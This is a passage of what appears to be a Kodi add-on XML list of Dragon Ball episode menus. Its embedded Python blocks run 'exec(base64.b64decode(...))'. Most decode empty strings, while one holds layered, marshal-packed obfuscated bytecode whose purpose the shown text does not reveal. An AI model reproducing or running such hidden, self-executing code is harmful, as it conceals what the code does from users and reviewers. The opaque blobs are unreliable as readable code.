dBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/cX9cfwc.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Euskera [COLOR yellow][/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://ugc.kn3.net/i/origin/http://3.bp.blogspot.com/-7Sq_1Ap72R0/TcnvEtT2eyI/AAAAAAAAA_Y/HWSWReXQsmI/s1600/camp-nou.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://ugc.kn3.net/i/origin/http://3.bp.blogspot.com/-7Sq_1Ap72R0/TcnvEtT2eyI/AAAAAAAAA_Y/HWSWReXQsmI/s1600/camp-nou.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://ugc.kn3.net/i/origin/http://3.bp.blogspot.com/-7Sq_1Ap72R0/TcnvEtT2eyI/AAAAAAAAA_Y/HWSWReXQsmI/s1600/camp-nou.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/1AzJu2T.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
--------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Latino [COLOR yellow][/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGZRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMTZUV3BWZDA1dFdYcE5SR040VGxSTk1rNXFXWGxOYlZreFRYcEtiVTVVUlhwUFJHTXdUakpGTVU1VVZYZE9WRUV5VFZSUk1VNVVhek5OYWxFeFRucFZNMDlVV1hoT2VsRXpUV3BWZWs0eVJURk9WR041VG5wSk1FMXFXbWxPUjBVeVQxUk5kMDVxYXpOT2VrcHRUbXBKTUUxcVdYbE9iVmt6VG1wU2JFNTZWVEZPYW1NMVRrUmpNVTlVWXpOT1JFa3hUMFJOTTA1NlZUQk5WRXB0VGxSQk1VNXFUVE5PUkdzelRWUmFiRTU2VlRKYVJGbDVUbTFOTWsxVVkzbE9hbGt4V1ZSWk5FNUVaek5QVkdNelRYcGpNRTlVVlRCT1IxbDVXV3BSTlU0eVJUQlpWRkp0VGxSWk1VMUVUWHBPZWtFelQxUktiVTVFWXpKTlZFMTRUWHBaZVZwcVVUUk5la1V6VDFSS2FVNUVaM3BPUkZrd1RtcFJNazVxU20xT2Vsa3hUV3BhYWs1dFNUSk5hbGsxVFcxWmVWcHFZekpPUjAwelRXcFNhazF0U1RKT1ZHTjRUbnBGTVU1NlNtMU5lazB3V1hwTk1FNXFXWHBQVkUwelRYcG5NazVVV214T2Vtc3lUa1JLYVUxdFNYcE5SRkUxVFhwamVrOUVUVFZOZWtWNlQxUktiVTU2UlRKT1ZHTjNUbXBKZWs5RVRYcE5lbFY2VDBSS2JVNVVRWHBPZWxwcVRrUm5lazFVU21sTmJVa3lUMVJhYTA1RVdYbFphbEp0VGxSWk1VMTZZM2xPYlVWNlQwUmthRTVxVVRKWmVtTjZUa2ROZWsxVVkzZE5lazB4V1ZSVk5VNUVXWHBQUkZKcVRrZEZNRnBVV21wT1JGa3lXbFJTYWs1SFdYcE5hbU16VG1wRk1VMVVUVEJPZWxsNlQwUk5NRTF0V1hwUFJGRXpUbnBCZWs1NlZYcE9ha1V6VFZSUk0wNTZhekJaVkZFd1RsUmpNRTE2VFROTmJWa3dXbXBhYkU1cVkzcE5lbU42VFhwVmVrNUVUVE5PZWsxNlRrUmFhMDVIVlRCT1ZGcHFUbnBSTWs1VVZUQk9lbGt3V21wU2JFNXFUVEpOZWswMFRrUlJlazVFVFhoT1IwMHpUbnBOZWs1SFdYcE5lbEY0VFcxSk1VNTZUWHBOYlVsNlRYcFpNRTVIVFRKTmVtTjZUa1JuTVUxRVdUUk9WRUV5VG1wWmVrMTZUVEJhYWxVeVRsUkpNRnBxVFRST2Vra3hUbXBWTWs1dFdUTk5hbGt4VFhwSk1GcHFZekJPVkdjd1QwUmpOVTVVVFROTlZGSm9Ua1JyTTAxVVVteE9SMVV3V2tSWk5VNTZaekZPZWswMVRucEJNMDFxV20xT2VrVXdXbFJTYUU1VVRUTk9SRmswVGxSTk1rNUVZekpPUkdkNlQwUk5OVTVVU1RGUFZHTjRUbXBWTTA5VVVtdE9WMFV6V1ZSWk5VNUVaM3BQVkdSb1RucFpNRTlFVlhwT2FtY3dXbXBaZWs1NlJURk5hbU16VGpKRk1VNXFXWGhPUkdNeFRYcGplRTV0VVRGTlZHTTFUbTFKTVZsVVRYaE9WRlY2VFhwU2FFNUhSVEJaYW1ONlRucEJNVTVxVW1wTmVsVjZUbnBTYUU1NmF6Tk5SRlV4VFhwVk0wMVVXWGxPYWxVeVRsUlpNMDV0VFhwT1ZHTXdUbGRGTUU1VVl6Rk9SRlY2VDBSTk5VNXFaekpOVkdNeVRYcGplazFVVVRWTmVsVXlUMFJhYWs1VVVYcE9WRlpvVGtSWk1VOUVXbWxPVkVreVdYcGplVTV0U1RKTlZHTXhUbFJWZWs1cVdtMU9SMDB3VG5wV2FFMTZVVE5OYW1NMVRrUkpNVTFFV1hwT2Fra3dXV3BrYUU1cVl6Sk9hbEUxVGxSRk1rMXFaR2hPVkZVeFRYcGpNVTVFV1hwUFJGRjVUbGRGTWxwcVRYbE9hbFV3V1ZSak1VNUhXVEpaYWxsNFRucEpNRnBVVVhoT1JHY3lXbXBWTTAxdFNUQk5lbHBzVG1wck0wNUVWVEZOZW1Nd1RYcFJlRTVxVFhsWmFtTTBUbXBuTWxwcVl6Uk9WRmt6VDFSUk0wNVVSVEZOYWxrelRucEJlazlFWXpOTmVrRXlUMVJWZUU1RVp6Tk9hbFpvVGtSTk1sbDZUWGRPUkZrd1drUlZlazVFVVRKT1JHTjZUbTFWZVZscVdUSk9SRlV3V2xSS2FVNXFSVEJQUkZFMFRrZFpNMDFFVVRST1JGRXpUVlJaTlU1RVJYcFBWR04zVGtSWk1scHFXbXBPYlZreVRXcFZNazVIV1RKTmVsa3pUbFJaZWs5VVVUVk9WRTE1V21wak1FNUVSWGxaYWswMFRtcHJNMDVVVFRKT2Vtc3hUbFJSZUUxdFdUTk5hbGt6VG1wbmVWcHFUWGxPVkUxNlRWUmFhVTV0VVRCUFZHTXlUbFJuTUU5VVdUVk9la1Y2VDFSVmVVNVVhM3BOYWsweFRucE5NRmxVVFRKT2FrVjVXV3BaTWsxNlNUTlBSRkpxVG0xVk1GcFVZekJPUkVWNVdtcFZNazVxVVRKT2VrcHRUa1JyTWsxNldtcE9WR013V1dwYWEwNVVZek5OYWxrMFRrZEZNMDE2Vm1oT2FsRXdUMVJWZUU1SFdYcE5SRkV6VGxSVk1FNUVWWGRPVkUwd1RsUlZORTVYUlRCYVJGbDVUWHBWTUU5VVZYcE9SMWw2VDFSVk5VNVVZekpPUkZab1RYcFJNRTFVV214T1IwVXpUVVJLYlU1VVZYcFBWRlV6VG1wSk1GbDZWWGhOZW1zeFRVUlJNazF0U1hwTlJFMHlUWHBOTTAxNldtbE5lbU14VDBSVmVrNXFVVE5OZWxKb1RsZEZlazlFVVhwT1JGVjZUbnBWZUUxNldYbFphbEp0VFhwck1scEVVbTFPYWxreFRXcFpNazU2U1RCTmVsRXdUVzFKTWsxcVVtbE9SMFV4VGtSamQwMTZWVEJOYWsxNlRtMU5NRTlVVW1wT2JWa3pUbXBhYVU1VVRYcFBSRnBxVFcxWk1rOVVZM2RPZWxFelRVUmFhVTV0U1RCUFJFcHRUWHBCTUU5VVVUQk5lbXN3V1dwS2FVNTZZekphVkZVMFRucG5NazlVV21sT1IwVjZUMFJOTWs1cVNUSlphbEpvVG1wVk0wNUVXWGxPYWxrd1dWUlplVTVFVFRGUFJFMTZUbFJSTUZscVdUSk9iVWw2VGxSUmVFMXRXWHBQUkZVeVRXMUpNazVFVW14T1Ixa3dXVlJOTUU1cVl6QlplbU0xVGtkRk1rNTZWVEpPVjBVeFRVUmplazU2VFROUFZGVjVUbTFWTWxwcVdtbE9WRmt6VG5wUk1FMXRXVEJPVkdOM1RucHJNRTU2VFRKT2VsVXlXV3BSZVU1SFRYbGFhbU42VG1wWk1rNVVWVEpPUkUxNlRWUmpOVTVIVFROT1JGVTFUbFJGTWs1cVdtMU9SRVV3VGtSYWFrNXFUVEpaYWxrMVRucE5NbGw2VlhkT2Ftc3lUV3BhYlUxNmEzcE5hbFY0VGxSbmVWbHFVWGxPZWtsNlRXcE5lVTU2VFRCT1JGSnRUWHBSTUZscVVUQk5lbXN3VGtSa2FFNTZUVEphYWxWNlRtcFplazVxVVRGT1JHY3lUMFJqTVUxNlNURk9WRnBvVG1wak1GbDZWWGROZWtFd1dsUlpNVTE2U1RCTmFsVjNUWHBuTVUxVVZYaE5lbXN6VDFSVmVFNVVZM3BPZWxwdFRYcFpNVTFVWTNkT01rVXhXVlJWTWs1SFdUSk5lbGt6VGxSTmVWcHFVVEpPUjAweVRrUmFhVTVIV1RGWlZFMHpUa1JWTWs1cVdURk9lazB5V21wamQwNXFWVEJOZWxWM1RXMUpNRmxxVVRSTmVtTXdUMVJOTTA1cWF6QlBSR013VGxkRmVrNVVUVFZOYlVrelRrUlJNMDVFUlRGTlJGRjRUVzFaTUZsVVVYaE5lazE2VFhwVmVFNUhTVEJPZW1ONFRrUk5NRTlFVFRGTmVrMHhXVlJTYlUxNlp6SmFWRlY0VG5wSk1rOVVXVFJPYlZVeFQxUlJNVTVxU1RCT1ZGRTBUVzFaTWxsNll6Rk9SMGt3VGxSS2FVNXFhekJPVkUxNlRYcEplazVVVW1sT2FrMHpUbFJTYkU1WFJUTk5WRlY2VGxSUk0wMTZXVE5OYlZsNlRYcFplRTVFWnpKYVJGVjRUbnBaTWs1cVZUSk9ha2t5VFdwUk1rNXFXVE5aVkZrMFRsUlJlazVxWXpST2FtY3dXWHBOTkU1VVNUQmFhbEV4VGxSVk1GbFVUWHBPUjFFeVRYcGplVTU2V1RKUFJGcG9UbXByTVUxRVZUTk9SRTB5V1dwWmVrNTZaekJPVkZVelRrUlZNVTFFVW0xT1JFMHdUMVJSTlUxNmF6SlBWRTE0VGtSVk1GcEVXVFZPZWxrd1QwUlZkMDVVVFRKWmVsVjVUbFJuTUU1VVVtcE5iVmt4V1ZSVmVrMTZTVEJPYWswMVRrUlpNRTE2V21oT2VrRXdUWHBLYVUxdFNUQlpWRTB4VGxSRk1FOUVZekZPZWtGNlQwUmplRTVVYXpKUFJGcHJUbFJCTWs5VVZUSk5lbGt5VDFSUk0wMTZhekJPZWswMVRtMU5lazU2Vm1oT2FsVXdXbXBOTVU1SFNYbFphbEY2VGtSak1FMTZWVFJOZWsweFRXcFpNVTVVVlRGWlZFMHpUbXBuTWxwRVNtbE9SMGt3VGtSTk0wNUVSVEpaZWsweFRYcGpNRTFxVW1oTmVtY3pUa1JTYkUxNlNUQlBWRkV3VFhwSk1FOVVXVEZPYWxVeFRucFJNMDVFWnpGT1ZFMHhUbnByTUU5RVZYZE9hazB5VDBSU2FVNUVSVE5PYWxsNVRsUkJNRmxxVVhsTmVsa3hUMVJOTlU1cVl6Tk9SRmsxVGtSRk1VOUVVVEpPYlVreVdXcFJlVTE2UlRKUFJGSnFUVzFaTUUxVVZYbE9WMFV3VGtSWk1rNVVhek5OVkUxM1RsUkZNazVVVVRWT1ZGVjZUMVJaZWs1Nlp6Qlpla3BwVGtkSk1rOVVZM2xPUkZVd1dtcFplVTVFVFRKT2VscHJUWHBKTVU1cVdUTk9iVVV3VGxSUk1FNXFVVEJPVkZwc1RYcE5NazlFVlhsTmJWa3lXbXBSZUUxdFdYcE9SRnBzVG5wQk1GbHFUVFJPZWtVeFRXcFplRTVFWjNsWmFsVjZUbTFOTWxsNldtdE9hazB3VGtSS2JVNTZhekJOZWxKdFRrUlZNMDVVVlhwTmVrMHdUMFJWTWs1SFRUSk9WRkpyVFhwTmVrMTZVbTFPZWtFeVdsUlpNMDV0VFRKT1ZGbDZUbXByTWxwRVNtbE9SMUV3VGtSS2JVNXFhekJaYWxsNlRqSkZlazlFVlRKT2VsVXdXbFJOTlU1NlJURk9lazB3VG1wak1scHFUWGxPVkVVeFdWUk5NMDU2UlROT1ZFMHlUa1JuTTA5VVdtbE9lbGt3V1dwUmVVMTZXWHBOUkZFMVRrUlZlVnBxVFhoT2JVVXlXbFJSTWs1NlZURk9hbU41VG5wQk1VMUVVWHBOYlZrd1dWUk5NMDV0UlhwTmVsSnRUbTFGZWsxNldteE9la2t5VFZSak1rNTZUVEJhVkZKcFRYcEZNMDVFVlhoT1ZFRXlUbFJqTVU1NlFYcE5lbU40VFhwRk1GbFVWVEJOZW1NelRrUlJNVTV0VlROTmVtTjNUVzFKTVU1cVdURk9iVWw2VG1wVk5VNVVWVEJaVkZreFRucEZNazlFWTNwT1ZGVXdXVlJqTTA1cVNUSlplazAwVG0xSk1scHFVbWhPVkUxNVdXcEthVTV0VlRCYWFsSnFUa2RaTTAxRVRYcE9iVmt4VFhwWk1rNXFVVEpaYWxWNFRXMUpNbGxxWTNsTmVrMHpUWHBSTkU1RVp6QlplbEV3VG0xVk1sbFVXWGxOZWtsNlRXcFplVTVFU1RKWlZGRTFUbXBGTUUxcVRYcE9SMWt6VFZSUmVFNTZWVEZPVkZrMVRYcEpNRTFxWXpKTmVrVXdUWHBSZVU1RVdUSk9SRlV5VGxSbk0wOUVVVEJPZWxrelRVUmFiVTF0V1RCYVJGVjNUbXBWTTAxcVdtaE9WRVV5VG5wYWJFNUhTWHBPVkZwdFRtMUZNMDFxWXpWTmJVa3lXbXBOTVUxNlp6Tk5SRXB0VG5wbmVrNXFVbWhOZWsxNlRVUmFhVTE2UlRKTlZGVXhUa2RKZWs1VVRUTk9WRlY2VDFSUk5FNUhWVEZOVkZKc1RYcEZNRTUwZlE0QUFFZFhlbHB0UkRKQ1VVd3lRVWRXTUVGUlRESkJSM2d3VFZGWGVrRkhTREpCUjB3eVFXMWFNRUZIV2pSYWJVd3dRVkZ3YkVGdFNETkJSMHd6UVVkT00xcHRSWFZhYlZwdFFsRkVhMEYzVEROYVVVVjZRWGRhTVVKSFRYZGFiVll4UVhkSU1rRlJXak5hZDB3MVdtMWFNMEpIU0RWYWJVNHhXbEZJYWtGUlJERkNSM0JzUVcxV01FMUhUREpCVVV3eFduZEZkVUZ0Y0RGYVVYQTBRVkZTTTBKUmNERkJkMGd3VEcxRWJGcHRVakJDVVhBd1FXMVNiVUZ0VERKQmJWb3dXa2RNTVVGNlNEQk5kMHd6UVZGYWJFMTNUWGxhYlVneFdtMXdNVUZVUkcxQmQwMTFRVzFFTWsxM1JEUmFiWFF5VFZGWGRscHRURE5CYlUxNlFYZFdiVnBIUkd4QmJVd3lRVkZNYkZwdFNERkJiWEJyUVhkSU1scEhjREphYlhSdFdsRmFOVUZSVmpOTVIxb3dRVzFPTWsxM1RYVkJkMHd5V20xRU5GcHRTREJhUjBnMVdtMTRNMEpIVERSQlIzQXpXa2RhYWxwdFREQkJiVVJzUVhkSU1reHRUWFZCZWt4dFdtMWFNRUZ0VmpOYVIwUXdRVzFFTVVGSFdteEJiVkl5UWtkRU1VRlVURzFhZDB3d1FXMWFNa0Z0VERGQmJYZ3dUVkZJYWtGNlJESmFkMGwxUVhkV01rRnRTRFJCYlZJeVRIZE1hMEZ0ZURGYVVVZ3lRVkZ3YlVGUlRYcEJWRnB0UWxGd2JGcHRlREpCYlVnelFYcFNiVUZ0UlhaQmJWSnRXbEZGZFVGSFdqRkNVVWcxUVhkRU1scHRjRzFCVVZJeFdsRk1OVUZSVmpGYVVVeHJRVkZFTUVGUmNEUmFiVkl4UVZGYWExcHRXak5CZDBneFFWRndiVUpIVERWQlIxWnRRVkZNTkVGSGRHMUJSMDEyUVcxSU0xcFJXakpCZWtnd1FYZEZkMEYzU0cxQmJYQnRRWGQwTTBGSFRYWkJWRVF6UVZGRmVrRnRkR3hOZDB3elFXMUVNbHB0Y0cxQlIxWXdRVkZFTUVGdFZqSk1iVVF3UVVkYWJVSlJUREZhYlhBelFYZE5lRUYzV2pGYVIwMTVRVzF3TWt4dGNHdEJSMFJ0V2xGRU1scHRWbTFhYlhCdFFWRlNNRTEzV2pKQmQxb3lRa2RNTWxwdFRETmFVWEJyV25wV01WcDNXbTFCUjFJelFWRklhMEZ0UkcxQlIwaHRRVkYwTWtGUlJYWmFla3h0UVZGSU0xcHRlRE5hVVUxMVFWUmFNVUpSUlhsQlIwZ3hRVzFGZUVGM1dqQkNSMDEyUVVkNE1FeDNTRFJCUjBoc1RYZEZkVUV5VWpKTmQzQnNRVzFJTUVGdFRHeEJiWGd5UVhkSU1VRkhUbTFCYlUxMVducE1NRUpIU0RCQmQzZ3lUSGROZVVGUmVERkNSMHd3UVhwTU1VRnRXalJCUjB3d1drZGFOVUZIVWpGQmQxb3hRVWRPTTBGdFdqSmFiVXhzVEhkWGVscHRXakJCYlZkNlFYcEliVUYzVjNwQmVsWnNUSGRhYWtGUldqRkJkM0F5V20xME1FMTNjR3BCYlVnelRFZE1NRnB0VmpCYVIxbzBRVWRhYlVGUmNYVkJiVWd4VEVkd01FRlVTREpCUjBWNVFYZDBNVUpSU0ROQmQwUXhRWGRGZUVGM1NEQk1iVVYxUVhwYU0wRjNSWGhCZWt4aFVVUmpNSEI2ZVdodVMwVTFWbEV3ZEZjeGRYbHhVM1ZZY0VoeFkwZ3daMnBZTTA5aVdqSTVSMDFSUlVKSU1razFjREpGYWxwNVdteEJWVkp0Y0VwclRVMVZSV1p4U0hCc2JsRjBhbHBVUldSS1ZFMWpSVWx4ZVc1SU5EUk5lbE5oY1RCNGJVcDNRV1J1U1dOSFFUSlRTVXAzZVhaeFUxWmxUVEpYTmtReVkydGFVWEZCU1VnMVZsZ3dPVFJIYlhWU2NsVndORWxSVDNoTlNrbGFjbmd4U0VsM2RUSkZWR05MYmxSeFozQkpWM2RDU1hGWGNuZFBUMGxTWjNaSU1WTm5XbEYxUlc5VVNXeEVTMWRGUlRJMVNYSktZMFZ1U1hBeVJVdDFRVzlWU1dOd1NYa3dTVXRCYWswd1RHMUplbXBxY1dGQlRVcDRTR1ZhVTJOSlIwaE1hMjh6VTB4Q1ZVVkxSak53YlVGU1JYcENWR051Y2xJMVNVcGhZMmxJZDFJd1NFdFhTMjVJUlhWdVZHY3lSWGRUTmtsU1FXZFliVVZGUWxWSlEwUkxlWGRKVTJOMVJWVlRhVWN5TldsTmVFRlFiMHB4ZWtkSWEwVklSMEZJYmxGMVprZExUbXBIUzNsNmNXRkVaVWhHT1hWeFUwbFJjVWhuUzFwSWVXVkhkM0ZrU1cxTlFYSktOVk5HTUdOblRIaEViVXd6WWpCSWRqZ3lTSGRPYkUxNlkyVkJTbXREV2toVFlVSkhlVVZJU0ZKbGNYaHdhVWw2VTBsTllYVlpTRXBTYVhBd1ZqRndla0ZSUWxGQmFVVnRXak5DVkhsWGJrcDFSM0o0UldOdVZWZEJSbmxOU0UweFltdEZiWGd6Y0ZWV05IRXhZMEpCYlhsYVJIcFdiRnBHWmpWQmVtTmxibnB4VVhCTFJERkdNRUZDUVZORlUxb3hUVmR1UjNGc2JsVk9ha2t5ZVdwSlNVVlpUSGhYWkVZd2VXSkhZVUZuVEcxSU1VcDVjV05DU0RWbmIwbEJWSEF5VjFCd1VWZFJjSGRhTVVWSGRUVkJkM0F3Y0ZOTmFFbEtNVzFhUzBneVIxSXdORUpUVTJsTmJWZGpSbEY1YTNKSVFXRkplWGxuUnpGUFprMUtabXRLVlVsclNHdzVNa0pWUVdkSU1sTXlTVWd3TVUxS1FXeEVNbU5qUmtwVFprRjZPWGxJVVZkc1dXMVdiSEJKY1hWSWJHZFZSVXBtTlVGU09XVkhVMHcwY0VwcmFFVklaMWhLUzFOM2NIbEJaMWt3VjBkdmJYRkRUVWRUUzB3d1owOXZTMFZqU1ZOU1pWcFVaelp2UzFNMlNYWTViRUY0YTFGSVVtZEJiMGRYTTNCTFkxcHdWVXhwYjB0SmJIQlNlVUpHZWsxTmJsUXdaVVpWUlZSWk1IRllUVWxCWWsxNFNUUllNR04zU1ZBNVozSkhRVkJ3TTBGSFIxVlhUMGN5UVRSd2VqRnNiekZqU1hBeFNXeENSMDk1Y1ZGU2JHNVVVMWRhTWtSbGNrZFhOa1poUVVkTWVuUXhSbnBtTlUxU2RXaFlNM2d5V2xGQmFVeGhZMmxhU25sblFUQm5NRmt6VTFod1VWZHBjRlY1VVc5UmNXNXdlRmRzUVZOMGEwcDRWMmROVkRocldtRlRSMFo2VFdaSU1YbEJUSGQxUjBkVWVHbHllVkkwU1hkVGExcFNVek5NU0ZObVdubFdha3AzZVZGSWQwbFBTbE5XYVZwSmNXTnZlblJyUlhkRlNsZ3pZekpGWVdONVRURndNRnBWVjFodWQwVkJXak5hTlhKNk5HcE1kMW96U1RKWFpXOUlaalJhVVUxaVdtRmFaWEpJY1ZoeVNuRkxiMVIxYTAxTFFVbHVlVk15Ym0xVGRVcDNkREpKYlV4c2NESTFlbkJVVFZwQmVuVlhUVXA0YW5KUmVYVk5TRk5WU2toV2ExcDNjRFZLWVhSbFJWSmpiVUZUWWpCTmJVMVRUSFk1UzNKSlNXSmFlRmR0UnpOMWJWcDNVak5KVkhGM1dEQXhWVVpKZFdwdk0xTlljSG81VjBKS1RURklTR0l3V2pGeFowbFVWek53ZUZkV2JsRlhXRzVKUld0SlNHTlpjbUY1WTI0emRWQnhNRWsxUjFWRldVaFVUVEZ3UzBsaFIzcFdaVmx0VTJWQllVRk5UVEJKZWtsNlRWUkNTMFZDUWxKRlpVRlRlVTF1TVU4eWJsRkpla2Q0Wm0xTlUwVjJSakF4WkhBeVRYcHlVMDlaVFV0RU5YQXlNVkJ2WVZkSVNGSlhTRXBSUlUxR1NIQXpSekE0YlZvd05YVktWV0l6YnpGeGEyOUhjRE5GUjFORlNHMUVNbTR5UVZwYVNFa3pibTFUTTBReU1XdEdTblZOY1ZKSmVVUjRaMWhhU1Uxc1FVcFNNa0pVU1VWd2QzRlRRVEkwTkVadFZqRndTRmRtYjBkTlpFRjRjR3hKUjBGSVRVdHhTVVF5Y0RGQ1VEbEVSSGRQV0c1U1VqUkZVM2xQUlVobmJFWXplRE5OUmpsWFNFdFRWMHA0Y1hoSFVua3dia2RYU1UxU1FWVkhNbmsyUjFKclprZFZlWHB1U0RVeWNraGFhVUZVWW1wdmJWWnBTbmw1TkZveWVXbEJla3h0UmxWWFEwVlZUVkJ5ZUdOaFdsUTRNMjU0TVd4QlZVUnRRVlJyUjBsVFNVRkJVWEJwY1ZSRWJVeEtRV3RIU2sxSlNVZzVRVUYzZVZSSVVHZG9jWHBTTVc1Nk9XdEZVWEZ0UVVoVGJYQmhXalJ1ZVVSc1FrbzBORzVWVjBGdmVYRktURzE0TVVSSlNVaHlTbXBsU0RCeGJVZ3ljWGx2UjBFMlNsRjRNRXhIVXpWQ1UwOU1iMU5UTmtZeVUzcEpNRGxNY0hsNU0yOTRTREZHVkRsaFdESkpkMEpTWTBsR01VMHhSbmRPTlUxVWVYZHhiWGwyUjBkRlVrcDRkV2hhUzJJelRYcDVSVTB3U1ZaRVIwNDBXVEoxWkc5M2RWQk1kbVpwUVcxSlVuRlJUVE5IU1ZOalNWQTVhbTR5ZFROd01IRXpSbmgxUlc4d1NXTkdZVXcwY0hoVE5rbGhWMjVFYlhneWIzbDVkMXAyWjJkTlZFbDRjREpqVjBaTFUwbEJNRFZ1UVVwME1VVnNaMXBLU0hsSVdUSklhbTR5V2pGYVZIRkZUWHBpYTNGM1JVdHZiWEZYUkRGRWJFMVNZMVZ2TVZadGJuaFRTVXhMVDNWSGJWTlhja2xJTTFwVmRVMXZkM0ZKY25oSWFuSjZTVE54ZVdOUlJubEZka2RKZVV0Qk1sSnRjVWR4VkVjemNHbHVVbXQxV2pGSlVFWXlUVUZhZWpVemIxSjVVVXhJVjFaYVMzbDZURXRPTVZneFNWZFliVk5wUjFGeE5rUjRUV0p2WVVWWWNETkpaWEpUU1RKTWQwOVFUVkZCYm5GNlowTkdNamhzUmxRNE1XOTJaMkpFZDAxVWJsSlhOVzlSZFZKd2VVOWlURXBhTVVGVFNXVnhNMVpwVFVsRWFVa3lSVzFhTUZkMVJYaE5lVWxSZVcxSk1XTmhjREExTm01VGVHVkNTVVZpUVdGTlZIQjJaMGRGZWxKclJIcHJSSEo2ZVVKeWVWb3lia2d3TlV3emVYaEpSMWQzVEhkU01rcDNWMVphYlZacVJsUTVia0pJTkdsR1VrMVBSMGc1ZUVReFUyZE5NREY0Y1hweFJrZEhUVEZJVlUxNWNGTnhiSEZVYTJ4dk1HZFhUVEIwYVVadFFVTkhiVUZEV2toblNrVmhjRE5hVTBsWFNrZ3hWMGxVVFVGQk0wMU1Ta3RTTUVoNE1WZEllSEJwY1RKeGVFcFVPRE5NYkRsUVRWUklhM0JKVDJwQlNWSTFiakZ4VjBsS2NWTk1SME